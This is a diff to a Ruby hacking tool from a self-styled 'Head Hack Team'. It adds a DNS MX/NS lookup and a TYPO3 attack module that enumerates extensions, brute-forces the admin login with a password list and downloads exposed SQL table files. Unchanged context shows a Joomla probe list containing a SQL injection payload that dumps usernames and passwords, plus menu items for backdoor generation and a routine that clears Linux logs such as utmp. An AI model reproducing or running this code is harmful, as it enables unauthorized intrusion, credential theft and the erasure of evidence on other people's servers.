@@ -1,8 +1,10 @@
 #/usr/bin/ruby -w 
 
 =begin 
-       Powred By T.H.H  <Abdelwahed>
+       Powred By T.H.H 
+                The Head Hack Team (:
 =end
+require "rest-client"
 require "nokogiri"
 require "colorize"
 require "open-uri"
@@ -21,7 +23,7 @@ puts "
                                                                  ".red                                                                             
 puts  "
                                    <Track my Target>       Gather information
-                                                               About Targets  
+                                                               About Targets   V1.5
 ".green
 
 while true do 
@@ -147,20 +149,127 @@ def banner()
     puts "{6} Cms Exploit Scanner ".green
     puts "{7} Backdoor Generation".green
     puts "{8} Linux Log Clear".green
+    puts "{9} Find MX/NS".green
     puts 
      end
      banner()
     while true do 
     print " info>>> : ".green
     $web = gets.chomp
+
+if $web == "9" then
+$urlss= "#{$url}"
+linktestermsns = $urlss.slice! "www."
+puts $urlss
+def mxns(s,n)
+	system ("curl https://dns-api.org/#{s}/#{$urlss} >#{n}.txt")
+end
+mxns("MX","mx")
+mxns("NS","ns")
+system("cls")
+puts "[+] Email Server".green
+system("cat mx.txt | grep value | cut -d ':' -f 2 | cut -d '0' -f 2")
+puts "[+] Name Server".green
+system("cat ns.txt | grep value | cut -d ':' -f 2 ")
+system("rm ns.txt && rm mx.txt")
+end
 class Exploitscanner
        def scanner()
         $sourcex = open("http://#{$url}").read
              
+                  if  ($sourcex =~ /generator" content="TYPO3/) then 
+puts  "
+
+████████╗██╗   ██╗██████╗  ██████╗ ██████╗     ██╗    ██╗████████╗
+╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔═══██╗╚════██╗    ██║    ██║╚══██╔══╝
+   ██║    ╚████╔╝ ██████╔╝██║   ██║ █████╔╝    ██║ █╗ ██║   ██║   
+   ██║     ╚██╔╝  ██╔═══╝ ██║   ██║ ╚═══██╗    ██║███╗██║   ██║   
+   ██║      ██║   ██║     ╚██████╔╝██████╔╝    ╚███╔███╔╝   ██║   
+   ╚═╝      ╚═╝   ╚═╝      ╚═════╝ ╚═════╝      ╚══╝╚══╝    ╚═╝   
+                                                                  
+
+                <https://github.com/bahaabdelwahed/>
+
+"
+$site = "http://#{$url}"
+if  ($site["http"].nil?) then 
+puts "USAGE <./typo3wt.rb http://target.com"
+exit
+end
+def testscan(path)
+uri = URI.parse("#{$site}/#{path}/")
+$code = Net::HTTP.get_response(uri)
+$r =  $code.code
+end
+testscan("typo3")
+if ($r == "200") or ($r == "500")then 
+print "---[+]".green
+puts "Typo3 Found "
+testscan("typo3/ext")
+     if $code.code == "200" then 
+   print "----[+]".green
+   puts "ExtensionPath can be without index #{$site}/typo3/ext/"
+     end 
+     puts "                       [+] Extension Enumerations [+]".red
+  
+             ext_name = ["crawler","api_macmade","be_acl","css_select","fl_header_slide","gsi_slideshow","slideshow","twwc_pages","pw_highslide_gallery","static_info_tables","yag_themepack_jquery","formhandler","gridelements","typo3_console","cron_ptaheutetoken","cron_menustyle","be_acl","linkhandler","cron_realurlconf","typdom3","realurl","ws_flexslider","tt_address","sr_freecaps","cron_ptaheuteregistrationtoken","cron_ptaheuterezeptursubst","t3s_jslidernews","additional_reports","api_macmade","phpmyadmin","doc_indexed_search"]
+
+                     
+             ext_name.each do |ext|
+                 typo3path = URI.parse("#{$site}/typo3conf/ext/#{ext}/")
+                 extcode = Net::HTTP.get_response(typo3path)
+                  if extcode.code == "200" then 
+                    print "[+] ".green
+                    puts "Found #{ext}"
+                  end
+             end
+   puts "                          [+] Vulnrability scanner [+]".red
+puts "Weak password -Panel Brute Force".blue
+user = "admin"
+File.open("list.txt").each do |password| 
+ah = RestClient.post "#{$site}/typo3/",{username: user,p_field: "#{password}"} do |response|
+print "[+]".blue
+puts "Test #{user} #{password} "
+if response.code == 302
+puts "Password Succes ".green
+break
+else 
+puts "Password Woring ".red
+end
+end
+end
+ puts "Database Disclosure ".blue
+def vull(ext,path,nam,tests)
+testscan("typo3conf/ext/#{ext}/")
+if $code.code == "200" then
+aa = open("#{$site}/#{path}").read
+if aa["#{tests}"].nil?  
+print "[-]".red
+	puts "#{nam}"
+else 
+print "[+]".green
+	puts "#{nam}"
+	puts " --- >Download sql file "
+	ff = File.new("ext_tables.sql","w+")
+	ff.puts "#{aa}"
+	ff.close
+end
+end
+end
+puts vull("crawler","/typo3conf/ext/crawler/ext_tables.sql","Crawler Extension 6.1.2","Table structure")
+sleep 1
+puts vull("twwc_pages","/typo3conf/ext/twwc_pages/ext_tables.sql","twwc_pages Extension 8.7.x","Table structure")
+sleep 1
+puts vull("yag_themepack_jquery","/typo3conf/ext/yag_themepack_jquery/ext_tables.sql","Themepack jQuery Extension 1.3.2","Table structure")
+else
+	print "[-]".red
+	puts "typo3 Not found"
+end
+
+ end
             
             
-            
-           if  ($source =~ /generator" content="Joomla/)
+           if  ($sourcex =~ /generator" content="Joomla/)
                        a = 1 
                    linkk = URI("#{$url}")
                    joomla = ["/administrator/index.php","/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=","index.php?option=com_jdownloads&Itemid=0&view=upload","/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload","/index.php?option=com_foxcontact&view=foxcontact&Itemid=113","/index.php?option=com_adsmanager&task=upload&tmpl=component","/index.php?option=com_users&view=registration","/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=","/index.php?option=com_content&amp;task=blogcategory&amp;id=60&amp;Itemid=99999%20union%20select%201,concat_ws(0x3a,username,password),3,4,5%20from%20jos_users/*","mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html","/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"]
@@ -469,7 +578,6 @@ linuxlog = [
 '/var/run/utmp',
 '/var/log/yum.log',
 '/var/log/xferlog',
-'c:/users/baha/Desktop/test/log.txt'
 ]
 
                             linuxlog.each do |log|
